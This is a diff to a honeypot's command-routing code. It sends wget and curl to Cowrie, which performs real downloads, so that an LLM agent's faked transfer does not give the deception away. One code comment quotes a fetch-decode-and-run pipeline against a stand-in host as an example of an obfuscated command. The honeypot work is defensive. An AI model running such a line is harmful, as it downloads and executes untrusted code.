@@ -70,6 +70,28 @@ COWRIE_UNIMPLEMENTED = {
 }
 
 
+# The inverse of COWRIE_UNIMPLEMENTED: commands Cowrie performs FOR REAL, so
+# routing them anywhere else makes the honeypot less convincing, not more.
+#
+# Cowrie opens the socket, fetches the bytes, and registers the file in its
+# filesystem. CowrieAgent holds ONE persistent shell per attacker session, so
+# a later `cat` (FI 0 -> cowrie) reads that same filesystem and returns the
+# real content. Verified 2026-08-31 against the live backend:
+#
+#     $ wget https://.../README.md   ->  Saving to: `/root/README.md'
+#     $ ls -la README.md             ->  -rw-r--r-- 1 root root 5278 ...
+#     $ cat /root/README.md          ->  # ATT&CK(R) STIX Data ...
+#
+# Their FI band is 3 (Download), which fi_routing sends to on_device. The LLM
+# then writes a flawless transfer log and saves nothing, so the attacker's next
+# `cat` says "No such file or directory" — a giveaway in two commands.
+#
+# Only wget and curl are listed. Cowrie also ships tftp and ftpget, but there
+# was no local TFTP/FTP server to verify them against, and an unverified entry
+# here would silently route a command to an agent that cannot handle it.
+COWRIE_AUTHORITATIVE = {"wget", "curl"}
+
+
 def _base_cmd(cmd: str) -> str:
     stripped = cmd.strip()
     return stripped.split()[0] if stripped else ""
@@ -319,6 +341,12 @@ def classify(cmd: str, session_history: list) -> str:
         if "on_device" in enabled:
             return "on_device"
         return _strongest([a for a in enabled if a != "cowrie"])
+
+    # Cowrie does this one for real — see COWRIE_AUTHORITATIVE. Checked AFTER
+    # the obfuscation test above, so `wget http://x/p.sh | base64 -d | sh`
+    # still escalates to cloud; only a plain transfer is handed to Cowrie.
+    if _base_cmd(cmd) in COWRIE_AUTHORITATIVE and "cowrie" in enabled:
+        return "cowrie"
 
     # FI band decides the rest — via config.yaml's fi_routing table (see
     # prompt/fi_manager.py for the FI score itself; fi_routing for which
